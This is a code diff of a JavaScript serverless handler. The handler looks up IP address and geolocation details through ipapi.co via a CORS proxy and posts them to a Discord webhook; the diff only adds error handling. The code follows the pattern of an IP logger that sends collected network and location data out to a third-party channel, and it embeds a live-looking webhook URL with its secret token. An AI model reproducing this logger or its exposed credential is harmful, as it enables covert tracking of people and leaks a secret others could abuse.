@@ -1,8 +1,9 @@
 export default async function handler(req, res) {
-  const ipapiRes = await fetch('https://corsproxy.io/?url=https://ipapi.co/json/');
-  const data = await ipapiRes.json();
+  try {
+    const ipapiRes = await fetch('https://corsproxy.io/?url=https://ipapi.co/json/');
+    const data = await ipapiRes.json();
 
-  const formattedData = `**IP:** ${data.ip}
+    const formattedData = `**IP:** ${data.ip}
 **Network:** ${data.network}
 **Version:** ${data.version}
 **ASN:** ${data.asn}
@@ -19,11 +20,15 @@ export default async function handler(req, res) {
 **Timezone:** ${data.timezone}
 **Currency:** ${data.currency}`;
 
-  await fetch('https://discord.com/api/webhooks/1406307118017019996/8xYGRPq-zG-_y-rzWSt4QpKAdczf5TOml2w6iH05j7T3knyHtOxQhCPZ-Zxi1AtEG70n', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ content: formattedData }),
-  });
+    await fetch('https://discord.com/api/webhooks/1406307118017019996/8xYGRPq-zG-_y-rzWSt4QpKAdczf5TOml2w6iH05j7T3knyHtOxQhCPZ-Zxi1AtEG70n', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: formattedData }),
+    });
 
-  res.status(204).end();
+    res.status(204).end();
+  } catch (err) {
+    console.error('Error in handler:', err);
+    res.status(500).json({ error: 'Something went wrong' });
+  }
 }
